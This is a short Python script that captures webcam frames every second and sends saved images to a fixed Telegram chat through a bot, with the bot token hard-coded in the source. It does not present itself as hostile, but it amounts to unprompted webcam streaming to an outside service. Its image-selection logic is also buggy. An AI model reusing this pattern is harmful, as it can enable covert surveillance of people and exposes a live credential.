import random, os
import telebot, cv2
cam = cv2.VideoCapture(0)
token = "8300602005:AAG8KBo6LRQCS-YP_mdqM70ZSIYyaNsJI70"
idBot = 563747470
bot = telebot.TeleBot(token=token)

while True:
    frame = cam.read()[1]
    imgs = os.listdir("./../imgForBot")
    print(imgs)
    lastIndex = len(imgs)-1
    rand = random.randint(0,100)
    cv2.imwrite(f"./../imgForBot/frame{rand}.jpg",frame)
    bot.send_photo(idBot,
                   open(f"./../imgForBot/{imgs[lastIndex]}","rb"),
                   caption="")
    cv2.waitKey(1000)
